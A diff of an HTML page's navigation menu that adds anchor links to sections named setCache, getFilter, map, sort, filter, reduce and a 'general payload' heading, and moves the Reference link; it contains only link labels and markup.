-            <li><a href="#2-dot-x-3-dot-x">2.x / 3.x</a></li>
+            <li><a href="#setcache">setCache</a></li>
+            <li><a href="#getfilter">getFilter</a></li>
           </ul>
         </li>
-        <li><a href="#reference">Reference</a></li>
+        <li><a href="#2-dot-x-3-dot-x">2.x / 3.x</a>
+          <ul>
+            <li><a href="#map">map</a></li>
+            <li><a href="#sort">sort</a></li>
+            <li><a href="#filter">filter</a></li>
+            <li><a href="#reduce">reduce</a></li>
+            <li><a href="#通用payload">通用payload</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
+    <li><a href="#reference">Reference</a></li>
   </ul>
 </nav>
         </div>
